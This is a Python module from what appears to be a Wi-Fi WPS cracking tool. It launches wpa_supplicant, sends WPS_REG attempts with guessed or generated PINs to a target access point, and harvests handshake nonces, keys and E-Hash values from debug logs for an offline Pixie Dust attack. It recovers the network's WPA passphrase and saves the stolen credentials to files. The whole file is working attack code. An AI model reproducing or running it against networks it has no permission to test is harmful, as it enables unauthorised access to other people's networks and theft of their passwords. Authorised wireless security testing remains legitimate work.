import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs
import logging
import re  # <-- Imported re
import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.collector as collector  # <-- Import as module

logger = logging.getLogger(__name__)

class ConnectionStatus:
    def __init__(self):
        self.STATUS = ''
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''

    def isFirstHalfValid(self) -> bool:
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        self.__init__()

class Initialize:
    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False):
        self.INTERFACE    = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT  = save_result

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()
        self.TEMPDIR = tempfile.mkdtemp()

        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
                temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
                self.TEMPCONF = temp.name

            self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
            self._initWpaSupplicant()

            self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
            self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.RETSOCK.bind(self.RES_SOCKET_FILE)
        except Exception as e:
            logger.error(f'Initialization failed: {e}')
            self._cleanup()
            raise

        self.DISCONNECT_COUNT = 0

        # --- Regex Dispatchers ---
        self.WPS_MATCHERS = [
            (re.compile(r'M2D'), self._on_wps_m2d),
            (re.compile(r'Building Message M(\d)'), self._on_wps_build_m),
            (re.compile(r'Received M(\d)'), self._on_wps_recv_m),
            (re.compile(r'Received WSC_NACK'), self._on_wps_nack),
            (re.compile(r'Enrollee Nonce.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_nonce),
            (re.compile(r'DH own Public Key.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_pkr),
            (re.compile(r'DH peer Public Key.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_pke),
            (re.compile(r'AuthKey.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_authkey),
            (re.compile(r'E-Hash1.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_ehash1),
            (re.compile(r'E-Hash2.*hexdump.*: ([\da-fA-F ]+)'), self._on_pixie_ehash2),
            (re.compile(r'Network Key.*hexdump.*: ([\da-fA-F ]+)'), self._on_wps_netkey),
        ]
        
        self.STATE_MATCHERS = [
            (re.compile(r': State: .* -> SCANNING'), self._on_state_scanning),
            (re.compile(r'WPS-FAIL'), self._on_state_wps_fail),
            (re.compile(r'Trying to authenticate with (.*)'), self._on_state_auth), # Captures full auth line
            (re.compile(r'Authentication response'), self._on_state_auth_resp),
            (re.compile(r'Trying to associate with (.*)'), self._on_state_assoc), # Captures full assoc line
            (re.compile(r'Associated with ([\da-fA-F:]+)'), self._on_state_assoc_resp),
            (re.compile(r'EAPOL: txStart'), self._on_state_eapol_start),
            (re.compile(r'EAP entering state IDENTITY'), self._on_state_eap_id_req),
            (re.compile(r'using real identity'), self._on_state_eap_id_resp),
            (re.compile(r'WPS-TIMEOUT'), self._on_state_wps_timeout),
            (re.compile(r'NL80211_CMD_DEL_STATION'), self._on_state_del_station),
            (re.compile(r'selected BSS ([\da-fA-F:]+)'), self._on_state_pbc_select),
        ]
        # --- End of Dispatchers ---

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self._cleanup()

    @staticmethod
    def _getHex(line: str) -> str:
        parts = line.split(':', 3)
        if len(parts) > 2:
            return parts[2].replace(' ', '').upper()
        return ''

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return 'Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        logger.info(f'WPS PIN: \'{wps_pin}\'')
        logger.info(f'WPA PSK: \'{wpa_psk}\'')
        logger.info(f'AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator    = src.wps.generator.WPSpin()
        # Collector is now imported as a module, no need to instantiate

        if pin is None:
            if pixiemode:
                try:
                    filename = pixiewps_dir / f"{bssid.replace(':', '').upper()}.run"
                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = generator.promptPin(bssid) or '12345670'

        try:
            if pbc_mode:
                self._wpsConnection(bssid, pbc_mode=pbc_mode)
                bssid = self.CONNECTION_STATUS.BSSID
                pin = '<PBC mode>'
            else:
                self._wpsConnection(bssid, pin, pixiemode)
        except KeyboardInterrupt:
            logger.warning('\nAborting…')
            if store_pin_on_fail and not pbc_mode and pin:
                collector.write_pin(bssid, pin) # Use module function
            return False

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            if self.WRITE_RESULT:
                collector.write_result(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK) # Use module function
            if self.SAVE_RESULT:
                collector.add_network(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK) # Use module function
            if not pbc_mode:
                try:
                    filename = pixiewps_dir / f"{bssid.replace(':', '').upper()}.run"
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True

        if pixiemode:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
                if pin:
                    return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                logger.error('Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                collector.write_pin(bssid, pin) # Use module function
            return False

    def _initWpaSupplicant(self):
        logger.info('Running wpa_supplicant…')
        wpa_supplicant_cmd = [
            'wpa_supplicant', '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ]

        try:
            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except FileNotFoundError:
            logger.error('wpa_supplicant not found. Make sure it is installed and in your PATH.')
            raise
        except (subprocess.CalledProcessError, Exception) as error:
            logger.error(f'Failed to open wpa_supplicant \n {error}')
            raise

        start_time = time.time()
        while True:
            if time.time() - start_time > 10:
                logger.error('wpa_supplicant control interface timed out.')
                if self.WPAS.poll() is None:
                    self.WPAS.terminate()
                raise RuntimeError("wpa_supplicant failed to initialize")
                
            ret = self.WPAS.poll()
            if ret is not None and ret != 0:
                logger.error(f'wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
                raise RuntimeError("wpa_supplicant exited unexpectedly")
            if os.path.exists(self.WPAS_CTRL_PATH):
                break
            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        self.RETSOCK.settimeout(10.0)
        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
            (b, _address) = self.RETSOCK.recvfrom(4096)
            inmsg = b.decode('utf-8', errors='replace')
            return inmsg
        except socket.timeout:
            logger.error('wpa_supplicant socket timeout.')
            return 'FAIL'

    def _sendOnly(self, command: str):
        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
        except socket.error as e:
            logger.debug(f"Socket send error: {e}")

    # --- NEW Refactored _handleWpas ---
    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False) -> bool:
        line = self.WPAS.stdout.readline()
        
        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')
        logger.debug(line) # Verbose output

        # Check WPS matchers
        if line.startswith('WPS: '):
            for pattern, handler in self.WPS_MATCHERS:
                match = pattern.search(line)
                if match:
                    handler(match, pixiemode) # Pass match obj and pixiemode
                    return True # Line was handled
        
        # Check general state matchers
        else:
            for pattern, handler in self.STATE_MATCHERS:
                match = pattern.search(line)
                if match:
                    handler(match, pbc_mode) # Pass match obj and pbc_mode
                    return True # Line was handled

        return True # Line was not significant, but we continue

    # --- DELETED _handle_wps_messages ---
    # --- DELETED _handle_connection_states ---
    # --- DELETED _handle_pixie_data ---

    # --- NEW Helper for setting pixie data ---
    def _set_pixie_data(self, attr_name: str, match: re.Match, expected_len: int, pixiemode: bool):
        """Helper to extract hex data from regex and set PIXIE_CREDS attribute."""
        hex_value = match.group(1).replace(' ', '').upper()
        if len(hex_value) == expected_len * 2:
            setattr(self.PIXIE_CREDS, attr_name, hex_value)
            if pixiemode:
                logger.debug(f'{attr_name}: {hex_value}')

    # --- NEW WPS Message Handlers ---
    def _on_wps_m2d(self, match: re.Match, pixiemode: bool):
        logger.warning('Received WPS Message M2D')
        src.utils.die('Error: AP is not ready yet, try later')
    
    def _on_wps_build_m(self, match: re.Match, pixiemode: bool):
        try:
            n = int(match.group(1))
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.info(f'Sending WPS Message M{n}…')
        except (IndexError, ValueError):
            pass

    def _on_wps_recv_m(self, match: re.Match, pixiemode: bool):
        try:
            n = int(match.group(1))
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.info(f'Received WPS Message M{n}')
            if n == 5:
                logger.info('The first half of the PIN is valid')
        except (IndexError, ValueError):
            pass

    def _on_wps_nack(self, match: re.Match, pixiemode: bool):
        self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
        logger.warning('Received WSC NACK')
        logger.error('Error: wrong PIN code')

    def _on_pixie_nonce(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('E_NONCE', match, 16, pixiemode)
        
    def _on_pixie_pkr(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('PKR', match, 192, pixiemode)

    def _on_pixie_pke(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('PKE', match, 192, pixiemode)
        
    def _on_pixie_authkey(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('AUTHKEY', match, 32, pixiemode)
        
    def _on_pixie_ehash1(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('E_HASH1', match, 32, pixiemode)
        
    def _on_pixie_ehash2(self, match: re.Match, pixiemode: bool):
        self._set_pixie_data('E_HASH2', match, 32, pixiemode)

    def _on_wps_netkey(self, match: re.Match, pixiemode: bool):
        self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
        hex_value = match.group(1).replace(' ', '').upper()
        self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(hex_value).decode('utf-8', errors='replace')

    # --- NEW Connection State Handlers ---
    def _on_state_scanning(self, match: re.Match, pbc_mode: bool):
        self.CONNECTION_STATUS.STATUS = 'scanning'
        logger.info('Scanning…')
        
    def _on_state_wps_fail(self, match: re.Match, pbc_mode: bool):
        if self.CONNECTION_STATUS.STATUS != '': # Avoid premature fails
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            logger.warning('wpa_supplicant returned WPS-FAIL')
            
    def _on_state_auth(self, match: re.Match, pbc_mode: bool):
        self.CONNECTION_STATUS.STATUS = 'authenticating'
        if 'SSID' in match.group(1):
            self.CONNECTION_STATUS.ESSID = self._decode_essid(match.group(0)) # Pass full line
        logger.info('Authenticating…')
        
    def _on_state_auth_resp(self, match: re.Match, pbc_mode: bool):
        logger.info('Authenticated')

    def _on_state_assoc(self, match: re.Match, pbc_mode: bool):
        self.CONNECTION_STATUS.STATUS = 'associating'
        if 'SSID' in match.group(1):
            self.CONNECTION_STATUS.ESSID = self._decode_essid(match.group(0)) # Pass full line
        logger.info('Associating with AP…')
        
    def _on_state_assoc_resp(self, match: re.Match, pbc_mode: bool):
        bssid = match.group(1).upper()
        if self.CONNECTION_STATUS.ESSID:
            logger.info(f'Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
        else:
            logger.info(f'Associated with {bssid}')
            
    def _on_state_eapol_start(self, match: re.Match, pbc_mode: bool):
        self.CONNECTION_STATUS.STATUS = 'eapol_start'
        logger.info('Sending EAPOL Start…')
        
    def _on_state_eap_id_req(self, match: re.Match, pbc_mode: bool):
        logger.info('Received Identity Request')
        
    def _on_state_eap_id_resp(self, match: re.Match, pbc_mode: bool):
        logger.info('Sending Identity Response…')
        
    def _on_state_wps_timeout(self, match: re.Match, pbc_mode: bool):
        logger.warning('Received WPS-TIMEOUT. Something might be wrong with the interface ⚠')
        
    def _on_state_del_station(self, match: re.Match, pbc_mode: bool):
        self.DISCONNECT_COUNT += 1
        if self.DISCONNECT_COUNT == 5:
            logger.warning('Received NL80211 DEL_STATION too many times. There is interference ⚠')
            
    def _on_state_pbc_select(self, match: re.Match, pbc_mode: bool):
        if pbc_mode:
            bssid = match.group(1).upper()
            self.CONNECTION_STATUS.BSSID = bssid
            logger.info(f'Selected AP: {bssid}')
    # --- End of Handlers ---

    def _decode_essid(self, line: str) -> str:
        try:
            # This logic expects the full line, e.g. "Trying to associate with SSID 'MyNet'"
            return codecs.decode(
                '\''.join(line.split('\'')[1:-1]),
                'unicode-escape'
            ).encode('latin1').decode('utf-8', errors='replace')
        except Exception:
            return "ESSID_DECODE_FAIL"

    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                       pbc_mode: bool = False) -> bool:
        self.PIXIE_CREDS.clear()
        self.CONNECTION_STATUS.clear()
        
        try:
            self.WPAS.stdout.read(300)
        except Exception:
            pass 

        if pbc_mode:
            if bssid:
                logger.info(f'Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                logger.info('Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            logger.info(f'Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self._sendAndReceive(cmd)
        if 'OK' not in r:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            logger.error(self._explainWpasNotOkStatus(cmd, r))
            return False

        WPS_TIMEOUT = 120
        start_time = time.time()
        while True:
            if time.time() - start_time > WPS_TIMEOUT:
                logger.error(f'WPS connection attempt timed out after {WPS_TIMEOUT} seconds.')
                self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'
                break

            # This call now uses the new refactored method
            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode) 
            if not res:
                break
            if self.CONNECTION_STATUS.STATUS in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self._sendOnly('WPS_CANCEL')
        return False

    def _cleanup(self):
        try:
            if hasattr(self, 'RETSOCK'):
                self.RETSOCK.close()
            if hasattr(self, 'WPAS') and self.WPAS.poll() is None:
                self.WPAS.terminate()
                self.WPAS.wait(timeout=2)
        except Exception as e:
            logger.debug(f'Exception during WPAS/socket cleanup: {e}')

        try:
            if hasattr(self, 'RES_SOCKET_FILE') and os.path.exists(self.RES_SOCKET_FILE):
                os.remove(self.RES_SOCKET_FILE)
            if hasattr(self, 'TEMPDIR') and os.path.isdir(self.TEMPDIR):
                shutil.rmtree(self.TEMPDIR, ignore_errors=True)
            if hasattr(self, 'TEMPCONF') and os.path.exists(self.TEMPCONF):
                os.remove(self.TEMPCONF)
        except Exception as e:
            logger.debug(f'Exception during file/dir cleanup: {e}')

    def __del__(self):
        self._cleanup()